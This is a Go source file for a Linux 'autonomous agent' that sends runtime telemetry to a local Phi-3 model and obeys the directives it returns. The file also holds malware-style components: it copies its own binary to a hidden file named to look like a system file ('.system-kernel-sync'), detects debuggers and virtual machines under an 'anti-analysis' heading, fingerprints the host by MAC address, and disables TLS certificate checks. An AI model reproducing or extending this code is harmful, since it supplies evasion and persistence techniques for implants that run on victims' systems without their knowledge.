//go:build linux
// +build linux

package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

/*
 * 🔑 SYSTEM CONFIGURATION & CONSTANTS
 */
const (
	Phi3Endpoint      = "http://127.0.0.1:11434/api/generate"
	ModelName         = "phi3:mini"
	MaxWorkerRestarts = 5
	BaseBackoff       = 2 * time.Second
	MaxBackoff        = 60 * time.Second
	PersistCacheFile  = ".cache/.system-kernel-sync"
	JitterMax         = 10 * time.Second
)

var (
	HostID         = ""
	AI             *Phi3CognitiveEngine
	SupervisorNode *Supervisor
	HttpClient     *http.Client
	TelemetryQueue = make(chan TelemetryMessage, 1000)
	clientOnce     sync.Once
	circuitMap     = make(map[string]*CircuitBreaker)
	circuitMu      sync.Mutex
)

// 🛡️ Resilient Circuit Breaker State Machine
type CircuitState int

const (
	StateClosed CircuitState = iota
	StateOpen
	StateHalfOpen
)

type CircuitBreaker struct {
	mu           sync.Mutex
	state        CircuitState
	failures     int
	threshold    int
	cooldownTime time.Time
	cooldown     time.Duration
}

func NewCircuitBreaker(threshold int, cooldown time.Duration) *CircuitBreaker {
	return &CircuitBreaker{
		threshold: threshold,
		cooldown:  cooldown,
		state:     StateClosed,
	}
}

func (cb *CircuitBreaker) Allow() bool {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	if cb.state == StateOpen {
		if time.Now().After(cb.cooldownTime) {
			cb.state = StateHalfOpen
			return true
		}
		return false
	}
	return true
}

func (cb *CircuitBreaker) RecordSuccess() {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	cb.failures = 0
	cb.state = StateClosed
}

func (cb *CircuitBreaker) RecordFailure() {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	cb.failures++
	if cb.failures >= cb.threshold {
		cb.state = StateOpen
		cb.cooldownTime = time.Now().Add(cb.cooldown)
	}
}

// 📦 Data Structures
type TelemetryMessage struct {
	ID        string                 `json:"id"`
	Type      string                 `json:"type"`
	Timestamp string                 `json:"timestamp"`
	Metrics   map[string]interface{} `json:"metrics"`
}

type OllamaRequest struct {
	Model  string `json:"model"`
	Prompt string `json:"prompt"`
	Stream bool   `json:"stream"`
}

type OllamaResponse struct {
	Response string `json:"response"`
	Done     bool   `json:"done"`
}

type CognitiveAssessment struct {
	RiskScore float64 `json:"score"`
	Directive string  `json:"directive"`
	Rationale string  `json:"rationale"`
}

// 🧠 REAL PHI-3 COGNITIVE DECISION ENGINE
type Phi3CognitiveEngine struct {
	Client         *http.Client
	Endpoint       string
	Model          string
	TrustIndex     float64
	EnvFingerprint map[string]float64
	mu             sync.RWMutex
}

func NewPhi3CognitiveEngine(endpoint, model string) *Phi3CognitiveEngine {
	engine := &Phi3CognitiveEngine{
		Client: &http.Client{
			Timeout: 20 * time.Second,
		},
		Endpoint:       endpoint,
		Model:          model,
		TrustIndex:     0.95,
		EnvFingerprint: make(map[string]float64),
	}
	engine.PerformEnvironmentalFingerprint()
	return engine
}

func (pe *Phi3CognitiveEngine) PerformEnvironmentalFingerprint() {
	pe.mu.Lock()
	defer pe.mu.Unlock()

	sandboxRisk := 0.0
	if isVirtualMachine() || isDebuggerAttached() {
		sandboxRisk = 1.0
	}

	cpuRatio := float64(runtime.NumCPU()) / 16.0
	if cpuRatio > 1.0 {
		cpuRatio = 1.0
	}

	pe.EnvFingerprint["sandbox_risk"] = sandboxRisk
	pe.EnvFingerprint["hardware_norm"] = cpuRatio
	pe.EnvFingerprint["stealth_index"] = 0.95
	pe.TrustIndex = math.Max(0.1, 0.95-(sandboxRisk*0.5))
}

func (pe *Phi3CognitiveEngine) EvaluateTelemetry(metrics map[string]interface{}) (CognitiveAssessment, error) {
	pe.mu.RLock()
	defer pe.mu.RUnlock()

	metricsJSON, err := json.MarshalIndent(metrics, "", "  ")
	if err != nil {
		return CognitiveAssessment{RiskScore: 5.0, Directive: "CONTINUE", Rationale: "Metrics marshaling error"}, err
	}

	prompt := fmt.Sprintf(
		"<|system|> You are an elite autonomous agent cognitive supervisor. Analyze the runtime telemetry and environmental posture. Determine a risk score (0.0 to 10.0), a tactical directive ('CONTINUE', 'THROTTLE', 'ISOLATE', or 'RESTART'), and a 1-sentence rationale. Respond strictly in valid JSON format with keys 'score' (float), 'directive' (string), and 'rationale' (string). <|end|><|user|>Runtime Telemetry:\n%s\nTrust Index: %.2f<|end|><|assistant|>",
		string(metricsJSON), pe.TrustIndex,
	)

	reqPayload := OllamaRequest{
		Model:  pe.Model,
		Prompt: prompt,
		Stream: false,
	}

	bodyBytes, err := json.Marshal(reqPayload)
	if err != nil {
		return CognitiveAssessment{RiskScore: 5.0, Directive: "CONTINUE", Rationale: "Serialization error fallback"}, err
	}

	resp, err := pe.Client.Post(pe.Endpoint, "application/json", bytes.NewBuffer(bodyBytes))
	if err != nil {
		return CognitiveAssessment{RiskScore: 3.0, Directive: "CONTINUE", Rationale: "Local LLM endpoint unreachable; maintaining safe defaults"}, err
	}
	defer resp.Body.Close()

	respData, err := io.ReadAll(resp.Body)
	if err != nil {
		return CognitiveAssessment{RiskScore: 5.0, Directive: "CONTINUE", Rationale: "Read error fallback"}, err
	}

	var ollamaResp OllamaResponse
	if err := json.Unmarshal(respData, &ollamaResp); err != nil {
		return CognitiveAssessment{RiskScore: 5.0, Directive: "CONTINUE", Rationale: "JSON parse fallback"}, err
	}

	cleanJSON := strings.TrimSpace(ollamaResp.Response)
	cleanJSON = strings.TrimPrefix(cleanJSON, "```json")
	cleanJSON = strings.TrimSuffix(cleanJSON, "```")
	cleanJSON = strings.TrimSpace(cleanJSON)

	var assessment CognitiveAssessment
	if err := json.Unmarshal([]byte(cleanJSON), &assessment); err != nil {
		return CognitiveAssessment{RiskScore: 4.0, Directive: "CONTINUE", Rationale: ollamaResp.Response}, nil
	}

	return assessment, nil
}

// 🔄 HIERARCHICAL SUPERVISOR & SELF-HEALING ENGINE
type Supervisor struct {
	ctx    context.Context
	cancel context.CancelFunc
	wg     sync.WaitGroup
	status string
	mu     sync.Mutex
}

func NewSupervisor() *Supervisor {
	ctx, cancel := context.WithCancel(context.Background())
	return &Supervisor{
		ctx:    ctx,
		cancel: cancel,
		status: "NOMINAL",
	}
}

func (s *Supervisor) SpawnWorker(name string, work func(ctx context.Context) error) {
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		restarts := 0

		for {
			select {
			case <-s.ctx.Done():
				return
			default:
			}

			err := func() (innerErr error) {
				defer func() {
					if r := recover(); r != nil {
						innerErr = fmt.Errorf("panic recovered in worker %s: %v", name, r)
					}
				}()
				return work(s.ctx)
			}()

			if err == nil {
				restarts = 0
				return
			}

			restarts++
			if restarts > MaxWorkerRestarts {
				s.updateStatus("DEGRADED")
				return
			}

			time.Sleep(calculateBackoff(restarts))
		}
	}()
}

func (s *Supervisor) updateStatus(st string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.status = st
}

func calculateBackoff(attempt int) time.Duration {
	backoff := BaseBackoff * time.Duration(1<<uint(attempt))
	if backoff > MaxBackoff {
		backoff = MaxBackoff
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(1000))
	return backoff + time.Duration(n.Int64())*time.Millisecond
}

// 🌐 RESILIENT NETWORK LAYER
func initHttpClient() {
	clientOnce.Do(func() {
		HttpClient = &http.Client{
			Timeout: 20 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:        100,
				MaxIdleConnsPerHost: 50,
				IdleConnTimeout:     45 * time.Second,
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					MinVersion:         tls.VersionTLS12,
				},
				ForceAttemptHTTP2: true,
			},
		}
	})
}

// 🧪 ANTI-ANALYSIS & HELPERS
func isDebuggerAttached() bool {
	err := syscall.PtraceAttach(os.Getpid())
	if err == nil {
		syscall.PtraceDetach(os.Getpid())
	}
	return err == nil || err == syscall.EPERM
}

func isVirtualMachine() bool {
	if content, err := os.ReadFile("/sys/class/dmi/id/product_name"); err == nil {
		s := strings.ToLower(string(content))
		if strings.Contains(s, "vmware") || strings.Contains(s, "virtualbox") || strings.Contains(s, "qemu") || strings.Contains(s, "kvm") {
			return true
		}
	}
	return false
}

func generateHostID() string {
	mac := getMACAddress()
	seed := mac + runtime.GOOS + runtime.GOARCH
	hash := sha256.Sum256([]byte(seed))
	return hex.EncodeToString(hash[:6])
}

func getMACAddress() string {
	ifcs, _ := net.Interfaces()
	for _, ifc := range ifcs {
		if len(ifc.HardwareAddr) > 0 && !strings.HasPrefix(ifc.HardwareAddr.String(), "00:00:00") {
			return ifc.HardwareAddr.String()
		}
	}
	return "00:00:00:00:00:00"
}

func persistAgent() {
	execPath, err := os.Executable()
	if err != nil {
		return
	}
	data, err := os.ReadFile(execPath)
	if err != nil {
		return
	}
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return
	}
	dst := filepath.Join(homeDir, PersistCacheFile)
	_ = os.MkdirAll(filepath.Dir(dst), 0700)
	_ = os.WriteFile(dst, data, 0700)
}

// 🚀 MAIN EXECUTION LOOP
func main() {
	persistAgent()
	HostID = generateHostID()
	initHttpClient()

	AI = NewPhi3CognitiveEngine(Phi3Endpoint, ModelName)
	SupervisorNode = NewSupervisor()

	// Spawn Autonomous Cognitive Monitoring and Self-Healing Worker
	SupervisorNode.SpawnWorker("CognitiveManagementSupervisor", func(ctx context.Context) error {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return nil
			case <-ticker.C:
				var m runtime.MemStats
				runtime.ReadMemStats(&m)

				telemetry := map[string]interface{}{
					"host_id":        HostID,
					"os":             runtime.GOOS,
					"arch":           runtime.GOARCH,
					"cpu_cores":      runtime.NumCPU(),
					"alloc_mb":       m.Alloc / 1024 / 1024,
					"num_goroutines": runtime.NumGoroutine(),
					"uptime_sec":     time.Now().Unix(),
				}

				// Execute real Phi-3 Transformer Inference
				assessment, err := AI.EvaluateTelemetry(telemetry)
				if err != nil {
					continue
				}

				// Enforce AI directives on agent subsystems
				switch assessment.Directive {
				case "THROTTLE":
					time.Sleep(15 * time.Second)
				case "ISOLATE":
					for len(TelemetryQueue) > 0 {
						<-TelemetryQueue
					}
				case "RESTART":
					return errors.New("cognitive engine requested subsystem reset")
				default:
					// CONTINUE normal operation
				}
			}
		}
	})

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	SupervisorNode.cancel()
	SupervisorNode.wg.Wait()
}
